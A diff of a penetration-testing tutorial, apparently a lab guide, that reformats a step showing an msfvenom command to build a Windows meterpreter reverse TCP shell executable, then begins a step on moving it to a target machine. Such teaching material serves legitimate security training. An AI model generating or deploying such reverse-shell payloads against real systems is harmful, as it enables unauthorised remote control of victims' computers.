@@ -6,12 +6,10 @@ This will require a little more manual setup than the other tasks so it is recom
 
 ### Generating a Payload w/ msfvenom
 
-\
-
-
-#### 1.) `msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe` this will generate a basic windows meterpreter reverse tcp shell 
-
-<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe 
+#this will generate a basic windows meterpreter reverse tcp shell
+```
 
 \
 2.) Transfer the payload from your attacker machine to the target machine.\
